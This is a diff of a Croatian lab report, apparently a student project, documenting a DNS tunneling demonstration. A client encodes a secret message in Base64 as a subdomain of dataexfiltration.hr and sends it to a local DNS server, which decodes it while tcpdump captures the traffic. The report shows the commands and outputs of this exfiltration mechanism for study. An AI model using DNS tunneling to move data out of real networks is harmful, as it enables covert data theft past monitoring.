@@ -222,79 +222,93 @@ Poziv transmit_dns_tunnel_message inicira stvarni DNS tunneling.
 
 Ovaj dio skripte služi kao demonstracija kako se jednostavan tekst može “zapakirati“ u DNS upit i poslati, što u praksi predstavlja osnovni mehanizam DNS eksfiltracije podataka.
 
-
 ## 2.4. Slanje poruke i snimanje prometa
 
-### 2.4.1. tcmdump
-
-Snimio sam pakete koji idu na portu 5354.
+U ovom dijelu praktičnog rada provedeno je testiranje implementiranog DNS tunneling sustava. Cilj je bio poslati skrivenu poruku klijentskom skriptom, omogućiti DNS poslužitelju da ju dekodira te usporedno snimiti cjelokupni mrežni promet kako bi se analizirali korišteni DNS paketi. Proces se sastoji od nekoliko koraka: pokretanja alata za snimanje prometa, aktiviranja DNS poslužitelja, slanja tunelirane poruke i konačnog pregleda dobivenih rezultata.
+### 2.4.1. Snimanje prometa korištenjem tcpdump alata
+Za praćenje mrežnog prometa odlučio sam koristiti alat tcpdump, budući da omogućuje precizno filtriranje paketa i spremanje snimljenog prometa u .pcap format pogodan za naknadnu analizu u Wiresharku. Budući da se DNS poslužitelj izvršava lokalno i sluša na portu 5354, konfigurirano je snimanje tog prometa. Snimanje prometa pokrenuo sam naredbom:
 ```
 sudo tcpdump -i lo udp port 5354 -w dns_tunnel.pcap
 ```
-<img width="674" height="53" alt="image" src="https://github.com/user-attachments/assets/68adec33-df9d-417a-9c34-c6cd96bd68a8" />
+Na ovaj je način pokrenuto snimanje svih UDP paketa koji prolaze kroz loopback (lo) sučelje i ciljaju port 5354. Snimanje je uspješno započelo i tcpdump je počeo zapisivati pakete u datoteku dns_tunnel.pcap.
 
+Ovaj korak bio je važan kako bi se kasnije moglo dokazati da se poruka doista prenosi unutar DNS upit
+
+<img width="674" height="53" alt="image" src="https://github.com/user-attachments/assets/68adec33-df9d-417a-9c34-c6cd96bd68a8" />
 
 ### 2.4.2. Pokretanje DNS servera
 
-Otvorio sam drugi terminal i u njemu pokrenuo
-
+U drugom terminalu pokrenuo sam DNS poslužitelj implementiran u skripti dns_server.py. Prvo sam se navigirao u odgovarajući direktorij:
+```
 cd dns_tunnel
 python3 dns_server.py
-
-I dobio poruku:
-
+```
+Nakok pokretanja, ispisala mi se pripadajuća poruka:
+```
 Starting DNS server on 0.0.0.0:5354
-
+```
+Ova poruka potvrđuje da se poslužitelj uspješno pokrenuo, da sluša na svim mrežnim sučeljima te da je spreman primati DNS upite. Poslužitelj se izvršava u kontinuiranoj petlji i obrađuje svaki pristigli DNS paket, uključujući i one koji nose kodirane podatke.
 <img width="830" height="84" alt="image" src="https://github.com/user-attachments/assets/63987700-56cc-457f-83bd-92c276547971" />
+
+<p align="center"><em>Slika 2: Pokretanje DNS poslužitelja</em></p>
 
 ### 2.4.3. Pokretanje klijenta i slanje poruke
 
-Otvorio sam treći terminal i pokrenuo:
-
+U trećem terminalu pokrenuta je klijentska skripta zadužena za slanje poruke tunelirane unutar DNS upita. Skripta client.py smještena je u istom direktoriju:
+```
 cd dns_tunnel
 python3 client.py
+```
+Nakon izvršavanja, ispisana je sljedeća poruka:
+```
+Message sent: 'Ova poruka je tajna.' as
+'T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr'
+```
+Ovaj ispis potvrđuje da je izvorni tekst “Ova poruka je tajna.“ uspješno kodiran u Base64 format i umetnut kao poddomena domene dataexfiltration.hr. Klijent je zatim generirao DNS A-upit prema lokalnom serveru.
 
-Što je ispisalo:
-
-donat@donat-VirtualBox:~$ cd dns_tunnel
-python3 client.py
-Message sent: 'Ova poruka je tajna.' as 'T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr'
-Response:
-id 64216
-opcode QUERY
-rcode NOERROR
-flags QR AA RD RA
+Dodatno, prikazan je sadržaj DNS odgovora:
+```
 ;QUESTION
 T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. IN A
 ;ANSWER
 T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. 300 IN A 127.0.0.1
-;AUTHORITY
-;ADDITIONAL
+```
+Ovo pokazuje da je server obradio zahtjev te vratio očekivani odgovor s IP adresom 127.0.0.1, što znači da je čitav tunelirani komunikacijski ciklus uspješno realiziran.
 
 <img width="729" height="238" alt="image" src="https://github.com/user-attachments/assets/1e803ab6-0953-43a0-8d24-d0fcdf73e0a1" />
 
-### 2.4.3. Čitanje tajne poruke
+<p align="center"><em>Slika 3: Uspiješno slanje i odgovor DNS upita</em></p>
 
-donat@donat-VirtualBox:~/dns_tunnel$ python3 dns_server.py
-DNS server is running on 0.0.0.0:5354
+### 2.4.4. Čitanje tajne poruke
+
+Na strani poslužitelja vidljivo je kako je server primio zahtjev, prepoznao domenu i dekodirao skrivenu poruku. U terminalu se prikazalo:
+```
 Received DNS request for: T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. from ('127.0.0.1', 41631)
 Decoded secret: Ova poruka je tajna.
 Responding with IP: 127.0.0.1
+```
+Ovaj ispis predstavlja dokaz da je tuneliranje uspješno izvedeno.
+DNS poslužitelj izdvojio je Base64 kodirani segment iz imena domene, dekodirao ga i rekonstruirao originalnu tekstualnu poruku.
 
 <img width="819" height="90" alt="image" src="https://github.com/user-attachments/assets/a6b2dc61-b38e-4c94-aeb6-af558db5e994" />
 
-### 2.4.4. Zaustavljanje tcpdump-a
+<p align="center"><em>Slika 4: Prikaz dekodirane poruke na serveru</em></p>
 
-Kada sam zaustavio tcpdump dobio sam 
+### 2.4.5. Zaustavljanje tcpdump-a
 
+Nakon završetka komunikacije, tcpdump proces je zaustavljen pritiskom tipki Ctrl + C. Alat je prikazao statistiku:
+```
 ^C2 packets captured
 4 packets received by filter
 0 packets dropped by kernel
-donat@donat-VirtualBox:~$ ^C
+```
+Zabilježena su ukupno dva paketa koji odgovaraju poslanom DNS upitu i dobivenom odgovoru.
+Snimljeni promet spremljen je u datoteku dns_tunnel.pcap, koja se može dodatno analizirati u alatu poput Wiresharka za detaljan pregled zaglavlja i sadržaja DNS paketa.
 
 <img width="232" height="67" alt="image" src="https://github.com/user-attachments/assets/ffc478b0-9204-4ccb-a292-85e283a33e76" />
 
-Te sam dobio datoteku dns_tunnel.pcap.
+<p align="center"><em>Slika 5: Statistika snimanja</em></p>
+
 
 ### 2.5. Analiza prometa u Wiresharku
 
